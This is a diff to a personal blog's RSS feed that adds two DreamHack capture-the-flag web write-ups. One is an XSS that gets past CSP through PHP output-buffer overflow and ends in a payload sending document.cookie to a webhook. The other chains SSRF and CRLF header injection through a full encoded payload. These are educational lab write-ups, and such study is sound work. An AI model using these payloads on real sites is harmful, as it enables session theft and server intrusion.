@@ -1,4 +1,85 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>minhi1</title><description>blogs</description><link>https://minhi1.github.io/</link><language>en</language><item><title>DreamHack - [Proton Memo challenge writeup]</title><link>https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-4/proton-memo/</link><guid isPermaLink="true">https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-4/proton-memo/</guid><description>Writeup for the Proton Memo challenge (level 4)</description><pubDate>Thu, 25 Dec 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;The vulnerability lies in the &lt;code&gt;set_attr()&lt;/code&gt; function.
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>minhi1</title><description>blogs</description><link>https://minhi1.github.io/</link><language>en</language><item><title>DreamHack - [Buffalo Wings challenge writeup]</title><link>https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-5/buffalo-wings/</link><guid isPermaLink="true">https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-5/buffalo-wings/</guid><description>Writeup for the Buffalo Wings challenge (level 5)</description><pubDate>Sun, 11 Jan 2026 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;In &lt;code&gt;index.php&lt;/code&gt;, the &lt;code&gt;echo&lt;/code&gt; command is called before calling &lt;code&gt;header()&lt;/code&gt; function.
+That might not trigger the CSP header, which can eventually let us execute Javascript code. Let&apos;s verify it.&lt;/p&gt;
+&lt;p&gt;Send a comment payload like below.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;comment = lol&amp;lt;img src=1 onerror=alert(1)&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;However, no alert is popped up. After searching on Google, I know that it is due to &lt;strong&gt;PHP Output Buffering&lt;/strong&gt; (&lt;a href=&quot;link&quot;&gt;https://stackoverflow.com/questions/2832010/what-is-output-buffering-in-php&lt;/a&gt;) behaviour. If you read this line of code in &lt;code&gt;Dockerfile&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;RUN sed -i &apos;215s/4096/8192/&apos; /etc/php/7.4/fpm/php.ini
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It edits the PHP configuration line, particularly, at line 215, change 4096 to 8192. This means change the output buffering size from 4096 bytes to 8192 bytes.&lt;/p&gt;
+&lt;p&gt;Now we know that our first payload does not work because the buffer is not filled, then it waits until the &lt;code&gt;header()&lt;/code&gt; function is called and send to browser.&lt;/p&gt;
+&lt;p&gt;So our target is to overflow 8192 bytes, but the &lt;code&gt;$comment&lt;/code&gt; is limited to 500 characters.&lt;/p&gt;
+&lt;p&gt;Now here comes the magic. If we have &lt;code&gt;script&lt;/code&gt; in comment text, it will echo additionally &quot;Malicious string Detected !!!!!&quot; and then the comment after filtering &quot;script&quot;. What matters is that it runs inside a &lt;strong&gt;while&lt;/strong&gt; loop, which keeps echo as long as &quot;script&quot; exists.
+--&amp;gt; This is where we can perform buffer overflow.&lt;/p&gt;
+&lt;p&gt;The idea is to let the while loops run as long as possible, to overflow 8192 bytes. We can achieve that by adding a long string like this.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;scrscrscrscrscrscr...iptiptiptiptiptipt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This payload each time removes a &quot;script&quot; text in between, then the string then forms another &quot;script&quot; in the middle again.&lt;/p&gt;
+&lt;p&gt;Let&apos;s send a new payload.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;lol&amp;lt;img src=1 onerror=alert(1)&amp;gt; scrscrscrscrscrscr...iptiptiptiptiptipt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This time, the alert poped up. Yay, we can perform XSS. Now we just need to send the payload to the bot and steals the cookie.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Remember to URL encode before send:&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;lol&amp;lt;svg onload=location.href=&quot;{webhook_url}?cookie=&quot;+encodeURIComponent(document.cookie)&amp;gt; scrscrscrscrscrscr...iptiptiptiptiptipt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;🚩 FLAG: DH{8b8d436dfb2a5a5459b9eb85fba631060ca6417fead150edb68980e107f5b90}&lt;/code&gt;&lt;/p&gt;
+</content:encoded></item><item><title>DreamHack - [API Portal challenge writeup]</title><link>https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-4/pyramid-copy/</link><guid isPermaLink="true">https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-4/pyramid-copy/</guid><description>Writeup for the API Portal challenge (level 4)</description><pubDate>Fri, 02 Jan 2026 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;There are many actions, but don&apos;t be confused. Most are pretty useless.&lt;/p&gt;
+&lt;p&gt;Flag is displayed in &lt;code&gt;flag.php&lt;/code&gt;, particularly this block of code.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;if ($_SERVER[&quot;REMOTE_ADDR&quot;] === &quot;127.0.0.1&quot; || $_SERVER[&quot;REMOTE_ADDR&quot;] === &quot;::1&quot;) {
+    if($_POST[&quot;mode&quot;] === &quot;write&quot; &amp;amp;&amp;amp; isset($_POST[&quot;dbkey&quot;]) &amp;amp;&amp;amp; isset($_POST[&quot;key&quot;])) {
+        
+        $k1 = md5($_POST[&quot;dbkey&quot;]);
+        $k2 = md5($_POST[&quot;dbkey&quot;].$_POST[&quot;key&quot;]);
+        echo &quot;k1 = &quot; . $k1 . &quot;&amp;lt;br&amp;gt;&quot;;
+        echo &quot;k2 = &quot; . $k2 . &quot;&amp;lt;br&amp;gt;&quot;;
+        $value = base64_encode($flag);
+
+        @file_put_contents(&quot;/tmp/api-portal/db/$k1/$k2&quot;, $value);
+        die(&quot;success&quot;);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;If successfully has IP address of localhost and the body (sent by POST request) contains the required data, then flag is written into &lt;code&gt;/tmp/api-portal/db/$k1/$k2&lt;/code&gt;.
+So we need to find somewhere that sends POST requests.&lt;/p&gt;
+&lt;p&gt;In the source code, &lt;code&gt;/net/proxy/post.php&lt;/code&gt; sends a POST request (via &lt;code&gt;file_get_contents()&lt;/code&gt;) to the input url with &lt;strong&gt;unsanitized&lt;/strong&gt; referer header.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$header = &quot;User-Agent: API Portal Proxy\r\n&quot;;
+$header .= &quot;X-Forwarded-For: {$ip}\r\n&quot;;
+$header .= &quot;X-Api-Referer: {$referer}&quot;;
+
+$ctx = stream_context_create(array(
+    &apos;http&apos; =&amp;gt; array(
+        &apos;method&apos; =&amp;gt; &apos;POST&apos;,
+        &quot;content&quot; =&amp;gt; &quot;&quot;, //TODO: implement
+        &apos;header&apos; =&amp;gt; $header
+    )
+));
+
+die(file_get_contents($url, null, $ctx));
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Even thought the IP is added into the header, if we make &lt;code&gt;file_get_contents()&lt;/code&gt; sends the request to the server itself, the IP is still localhost.&lt;/p&gt;
+&lt;p&gt;To have the POST body, the only piece of information left is the &lt;code&gt;X-Api-Referer&lt;/code&gt; header. So I searched on Google and found out that because the &lt;code&gt;$referer&lt;/code&gt; is not sanitized and added directly to the header, it is vulnerable to &lt;strong&gt;CRLF Injection&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;We can extend the header with &lt;code&gt;Content-Length&lt;/code&gt; and &lt;code&gt;mode=...&amp;amp;dbkey=...&amp;amp;key=...&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;First, let&apos;s craft the payload to &lt;strong&gt;SSRF&lt;/strong&gt; the server.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/?action=net/proxy/post&amp;amp;url=127.0.0.1/index.php?action=flag/flag
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;With this payload, &lt;code&gt;file_get_contents()&lt;/code&gt; will send request to the localhost again.&lt;/p&gt;
+&lt;p&gt;Then, we add the CRLF Injection payload.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Put the CRLF payload in another dummy parameter, don&apos;t concat it directly to the url. Because then, the url that is passed into &lt;code&gt;file_get_contents()&lt;/code&gt; will be wrong.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;/?action=net/proxy/post&amp;amp;url=127.0.0.1/index.php?action=flag/flag&amp;amp;dummy=%0d%0aContent-Type:+application/x-www-form-urlencoded%0d%0aContent-Length:+28%0d%0a%0d%0amode=write%26dbkey=uia%26key=tr3
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;After the flag is put into &lt;code&gt;/tmp/api-board/db/&amp;lt;md5(&apos;uia&apos;)&amp;gt;/&amp;lt;md5(&apos;uiatr3&apos;)&amp;gt;&lt;/code&gt;, use the &lt;code&gt;/?action=db/read&amp;amp;dbkey=uia&amp;amp;key=tr3&lt;/code&gt; to achieve the flag.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;However&lt;/strong&gt;, we forgot an important step. At first, we need to create the directory first.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/?action=db/create&amp;amp;key=uia
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This creates the directory &lt;code&gt;/tmp/api-board/db/&amp;lt;md5(&apos;uia&apos;)&amp;gt;&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Then, create the sub-directory, which is &lt;code&gt;uiatr3&lt;/code&gt;, using the &lt;code&gt;/?action=db/save&amp;amp;dbkey=uia&amp;amp;key=tr3&amp;amp;value=hihi&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/?action=db/save&amp;amp;dbkey=uia&amp;amp;key=tr3&amp;amp;value=hihi
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This creates the directory &lt;code&gt;/tmp/api-board/db/&amp;lt;md5(&apos;uia&apos;)&amp;gt;/&amp;lt;md5(&apos;uiatr3&apos;)&amp;gt;&lt;/code&gt; and adds value &quot;hihi&quot; to it.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;🚩 Flag: GoN{WhyCrLfCrLfIsntFiltered}&lt;/code&gt;&lt;/p&gt;
+</content:encoded></item><item><title>DreamHack - [Proton Memo challenge writeup]</title><link>https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-4/proton-memo/</link><guid isPermaLink="true">https://minhi1.github.io/minhi1-blogs/posts/dreamhack/level-4/proton-memo/</guid><description>Writeup for the Proton Memo challenge (level 4)</description><pubDate>Thu, 25 Dec 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;The vulnerability lies in the &lt;code&gt;set_attr()&lt;/code&gt; function.
 Notice that, the untrusted data here is &lt;code&gt;selected_option&lt;/code&gt;, which is restricted with two options by the front-end, but freely in the backend.&lt;/p&gt;
 &lt;p&gt;The probable unsafe method that &lt;code&gt;selected_option&lt;/code&gt; falls into is &lt;code&gt;setattr()&lt;/code&gt;, which is Python built-in function.&lt;/p&gt;
 &lt;p&gt;So I did a Google search with &lt;code&gt;python setattr() user-controller attributes vulnerability&lt;/code&gt; and found this &lt;a href=&quot;https://snyk.io/blog/the-dangers-of-setattr-avoiding-mass-assignment/&quot;&gt;link&lt;/a&gt;.&lt;/p&gt;
